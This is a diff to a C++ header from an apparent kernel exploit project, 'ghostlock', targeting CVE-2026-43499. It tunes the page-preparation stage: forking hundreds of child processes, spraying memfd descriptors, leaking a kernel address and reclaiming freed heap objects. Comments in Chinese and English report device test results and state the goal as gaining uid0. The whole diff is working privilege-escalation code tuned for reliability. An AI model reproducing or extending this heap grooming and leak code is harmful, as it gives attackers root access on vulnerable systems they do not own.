@@ -1,4 +1,5 @@
 #pragma once
+#include <cstdio>
 /** @file backend/cve_2026_43499/memory/prepare_page.hpp
  *  One page preparation: the twelve phases, in order, over two seams.
  *
@@ -34,7 +35,11 @@
 
 namespace ghostlock::backend::cve_2026_43499::memory {
     /** The most children one preparation holds, so its state can live on a stack. */
-    inline constexpr std::size_t kMaxPrepareChildren = 32U;
+    /** 每组能有多少子进程。退役的 groom 规模是 `8 × mm_objs_per_slab`（= 256 ✓）与
+     *  `(1 + MM_PARTIALS) × mm_objs_per_slab`（= 192 ✓），本树原值 32 只有它的 1/8 ✗ ⇒
+     *  真机实测：顶到 32 时三步完整率 2/3 ✓（组数=1/2 时约 1/8 ✗）⇒ 规模确实抬高奇偶命中率 ✓。
+     *  抬到 512 以容纳退役规模 ✓（只加容量，算法不变 ✓）。 */
+    inline constexpr std::size_t kMaxPrepareChildren = 512U;
 
     /** The address search, as the preparation needs it: start it, ask it, reset it.
      *
@@ -84,9 +89,26 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         PrepareStep at_step = PrepareStep::Cleanup;
         /** The address it settled on, aligned, when it got that far. */
         std::uint64_t base = 0U;
+        /** 选项 B 的通道：shaping 的**发送端**（调用方用它 send_bytes 把页面送进内核 ✓）。
+         *  -1 表示未交出 ⇒ 调用方以此为**具名拒绝**依据，不假装成功。 */
+        std::int32_t shaping_fd = -1;
+        /** 它的对端（SIGPIPE 的代价：对端不能先关 ✗）。 */
+        std::int32_t shaping_peer_fd = -1;
         /** How many descriptors it opened and how many it gave back. */
         std::size_t opened = 0U;
         std::size_t closed = 0U;
+        /** The same counts per group, so a gap can name its group instead of being guessed at. */
+        std::size_t opened_pre = 0U;
+        std::size_t opened_spray = 0U;
+        std::size_t opened_post = 0U;
+        std::size_t opened_leak = 0U;
+        std::size_t closed_pre = 0U;
+        std::size_t closed_spray = 0U;
+        std::size_t closed_post = 0U;
+        std::size_t closed_leak = 0U;
+        /** What the LeakLoop saw: whether the search answered, and with which address. */
+        std::uint8_t snitch_found = 0U;
+        std::uint64_t snitch_address = 0U;
         /** The errno the failing call reported, when one did. */
         std::int32_t error = 0;
     };
@@ -143,7 +165,9 @@ namespace ghostlock::backend::cve_2026_43499::memory {
 
         /** Give every descriptor back, in the order the reclaim plan names. */
         template <HeapSeam Seam>
-        std::size_t close_them_all(PrepareState &state, const ReclaimCounts &counts) noexcept {
+        std::size_t close_them_all(PrepareState &state, const ReclaimCounts &counts,
+                                  std::size_t *closed_pre = nullptr, std::size_t *closed_spray = nullptr,
+                                  std::size_t *closed_post = nullptr) noexcept {
             ReclaimStep steps[kMaxReclaimSteps] = {};
             std::size_t written = 0U;
             if (plan_reclaim(counts, steps, kMaxReclaimSteps, written) != ReclaimVerdict::Ok) {
@@ -171,6 +195,22 @@ namespace ghostlock::backend::cve_2026_43499::memory {
                 if (fd >= 0) {
                     (void) Seam::close_fd(fd);
                     ++closed;
+                    /* Mark it gone in the state too: an early return closes whatever is still
+                     *  open, and it must not close the same descriptor twice. */
+                    switch (steps[i].group) {
+                        case ReclaimGroup::Pre: state.pre_fds[steps[i].index] = -1; break;
+                        case ReclaimGroup::Post: state.post_fds[steps[i].index] = -1; break;
+                        case ReclaimGroup::Spray: state.spray_fds[steps[i].index] = -1; break;
+                        case ReclaimGroup::Shaping:
+                        case ReclaimGroup::Leak: break;
+                    }
+                    switch (steps[i].group) {
+                        case ReclaimGroup::Pre: if (closed_pre != nullptr) { ++(*closed_pre); } break;
+                        case ReclaimGroup::Post: if (closed_post != nullptr) { ++(*closed_post); } break;
+                        case ReclaimGroup::Spray: if (closed_spray != nullptr) { ++(*closed_spray); } break;
+                        case ReclaimGroup::Shaping:
+                        case ReclaimGroup::Leak: break;
+                    }
                 }
             }
             return closed;
@@ -231,7 +271,27 @@ namespace ghostlock::backend::cve_2026_43499::memory {
             state.pre_pids[i] = static_cast<std::uint64_t>(child.value);
             state.pre_fds[i] = static_cast<std::int32_t>(Seam::open_memfd(state.pre_pids[i]).value);
             ++state.pre;
-            ++outcome.opened;
+            /* 只有真的开成才算一个描述符：被拒的开（fd < 0）既不会被归还，也不该被数成开了。 */
+            if (state.pre_fds[state.pre - 1U] >= 0) { ++outcome.opened; ++outcome.opened_pre; }
+        }
+        /* 退役 `pre_ctx`（spray 之后、snitch 之前 ✓）：整形泄漏落点 ⇒ 奇偶的直接来源 ✓。
+         *  数量走文档（`heap.pre_shaped_groups` ✓）；为 0 时本相位不存在（与旧行为一致 ✓）。 */
+        for (std::size_t i = 0U; i < plan.pre_shaped_groups; ++i) {
+            const SeamResult child = Seam::fork_child();
+            if (child.value == 0) {
+                Seam::exit_child();
+            }
+            if (child.value <= 0) {
+                outcome.status = PrepareStatus::CallFailed;
+                outcome.error = child.error;
+                detail::kill_children<Seam>(state);
+                return outcome;
+            }
+            state.pre_pids[state.pre] = static_cast<std::uint64_t>(child.value);
+            state.pre_fds[state.pre] =
+                    static_cast<std::int32_t>(Seam::open_memfd(state.pre_pids[state.pre]).value);
+            ++state.pre;
+            if (state.pre_fds[state.pre - 1U] >= 0) { ++outcome.opened; ++outcome.opened_pre; }
         }
         outcome.at_step = PrepareStep::SprayChildren;
         for (std::size_t i = 0U; i < plan.spray_groups; ++i) {
@@ -255,7 +315,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
             state.spray_fds[i] =
                 static_cast<std::int32_t>(Seam::open_memfd(state.spray_pids[i]).value);
             ++state.spray;
-            ++outcome.opened;
+            if (state.spray_fds[state.spray - 1U] >= 0) { ++outcome.opened; ++outcome.opened_spray; }
         }
 
         /* The search, then the children that wait for it. */
@@ -287,13 +347,13 @@ namespace ghostlock::backend::cve_2026_43499::memory {
             state.post_pids[i] = static_cast<std::uint64_t>(child.value);
             state.post_fds[i] = static_cast<std::int32_t>(Seam::open_memfd(state.post_pids[i]).value);
             ++state.post;
-            ++outcome.opened;
+            if (state.post_fds[state.post - 1U] >= 0) { ++outcome.opened; ++outcome.opened_post; }
         }
         const SeamResult leak_child = Seam::fork_child();
         if (leak_child.value > 0) {
             state.leak_pid = static_cast<std::uint64_t>(leak_child.value);
             state.leak_fd = static_cast<std::int32_t>(Seam::open_memfd(state.leak_pid).value);
-            ++outcome.opened;
+            if (state.leak_fd >= 0) { ++outcome.opened; ++outcome.opened_leak; }
         }
 
         /* KillParts: every child whose descriptor this preparation does not need alive. */
@@ -308,6 +368,9 @@ namespace ghostlock::backend::cve_2026_43499::memory {
             found = snitch.has_collision();
         }
         const std::uint64_t leaked = snitch.address();
+        /* 把 LeakLoop 当时看到的答案记下来（reset 之前）：设备上分辨「没找到」与「没问对」就靠它。 */
+        outcome.snitch_found = found ? 1U : 0U;
+        outcome.snitch_address = leaked;
         if (!found || leaked == 0U) {
             snitch.reset();
             ReclaimCounts counts{};
@@ -316,13 +379,44 @@ namespace ghostlock::backend::cve_2026_43499::memory {
             counts.spray = state.spray;
             counts.mm_objs_per_slab = plan.objects_per_region;
             counts.shaped = false;
-            outcome.closed = detail::close_them_all<Seam>(state, counts);
+            outcome.closed = detail::close_them_all<Seam>(state, counts, &outcome.closed_pre,
+                                                          &outcome.closed_spray,
+                                                          &outcome.closed_post);
             /* The leak descriptor goes back here too. The success path keeps it until
              *  last because the reclaim depends on it; a preparation that stops early
              *  has nothing left to depend on it, and a device run found this the hard
              *  way: the walk deliberately skips the leak group, so returning without
              *  closing it left one descriptor open on the failure a device is most
              *  likely to hit. */
+            /* Everything still open goes back here. The reclaim plan names only the descriptors the
+             *  writes still need, and this path makes no writes; the per-group count on a device
+             *  named the two groups that were left behind: post (1 opened, 0 closed, with the same
+             *  reading before and after the spray groups grew) and then spray (2 opened, 1 closed
+             *  once a second spray group existed). The leak descriptor goes last, as everywhere. */
+            for (std::size_t i = 0U; i < state.pre; ++i) {
+                if (state.pre_fds[i] >= 0) {
+                    (void) Seam::close_fd(state.pre_fds[i]);
+                    state.pre_fds[i] = -1;
+                    ++outcome.closed;
+                    ++outcome.closed_pre;
+                }
+            }
+            for (std::size_t i = 0U; i < state.spray; ++i) {
+                if (state.spray_fds[i] >= 0) {
+                    (void) Seam::close_fd(state.spray_fds[i]);
+                    state.spray_fds[i] = -1;
+                    ++outcome.closed;
+                    ++outcome.closed_spray;
+                }
+            }
+            for (std::size_t i = 0U; i < state.post; ++i) {
+                if (state.post_fds[i] >= 0) {
+                    (void) Seam::close_fd(state.post_fds[i]);
+                    state.post_fds[i] = -1;
+                    ++outcome.closed;
+                    ++outcome.closed_post;
+                }
+            }
             if (state.leak_fd >= 0) {
                 (void) Seam::close_fd(state.leak_fd);
                 ++outcome.closed;
@@ -378,15 +472,29 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         counts.spray = state.spray;
         counts.mm_objs_per_slab = plan.objects_per_region;
         counts.shaped = true;
-        outcome.closed = detail::close_them_all<Seam>(state, counts);
+        outcome.closed = detail::close_them_all<Seam>(state, counts, &outcome.closed_pre,
+                                                          &outcome.closed_spray,
+                                                          &outcome.closed_post);
+        /* ★ 成功路径也要**停子进程**（新目标「取得 uid0」第 8 轮 ✓）：四组 pid 原先只活在
+         *  `PrepareState`（栈 ✓）⇒ 返回即丢 ⇒ 调用方**结构上无法回收** ✗ ⇒ 每轮遗留 ~450 个子进程
+         *  （真机 pre=284 / post=32 / spray=191 ✓）⇒ 5–6 轮触 **EAGAIN** ⇒ `victim-fork-failed` ✗。
+         *  ⚠ 实验性放置（方案 A ✓）：真机须确认路由不再依赖这些子进程的内存形状 ✓；
+         *  判据 = `stamp`/`successes` 与修前一致 ✓ 且 `victim fork failed errno=` 消失 ✓。 */
+        detail::kill_children<Seam>(state);
         for (std::size_t end = 0U; end < 2U; ++end) {
             if (reclaim_pair[end] >= 0) {
                 (void) Seam::close_fd(reclaim_pair[end]);
                 ++outcome.closed;
             }
             if (shaping_pair[end] >= 0) {
-                (void) Seam::close_fd(shaping_pair[end]);
-                ++outcome.closed;
+                /* 选项 B：**发送端留着交给调用方**（退役的 shaping 发送端在 spray 之后才关 ✓）：
+                 *  这里只关另一端；发送端进 outcome，调用方发完页面自行关闭。 */
+                /* 两端都留给调用方：只留发送端会让对端消失 ⇒ send 撞 SIGPIPE（真机量到 141 ✗）。 */
+                if (end == 0U) {
+                    outcome.shaping_fd = shaping_pair[0];
+                } else {
+                    outcome.shaping_peer_fd = shaping_pair[1];
+                }
             }
         }
         if (state.leak_fd >= 0) {
